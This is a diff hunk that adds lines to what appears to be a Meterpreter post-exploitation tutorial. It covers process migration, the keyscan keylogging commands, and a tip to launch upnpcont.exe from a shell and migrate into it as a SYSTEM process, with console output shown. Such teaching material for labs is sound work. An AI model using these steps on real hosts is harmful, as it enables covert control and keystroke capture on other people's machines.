@@ -502,6 +502,16 @@ Process List
  396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           
 ```  
 `migrate`: Migrating to another process will help Meterpreter interact with it. For example, if you see a word processor running on the target (e.g. word.exe, notepad.exe, etc.), you can migrate to it and start capturing keystrokes sent by the user to this process. Some Meterpreter versions will offer you the `keyscan_start`, `keyscan_stop`, and `keyscan_dump` command options to make Meterpreter act like a keylogger. Migrating to another process may also help you to have a more stable Meterpreter session.  
+Good target process for migrating is `upnpcont.exe`.  
+```
+meterpreter > shell
+C:\Windows\system32>c:\windows\system32\upnpcont.exe
+[ctrl+z]
+meterpreter > ps
+PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+716  3040  upnpcont.exe          x64   0        NT AUTHORITY\SYSTEM           c:\windows\system32\upnpcont.exe
+```
 ```
 meterpreter > migrate 716
 [*] Migrating from 1304 to 716...
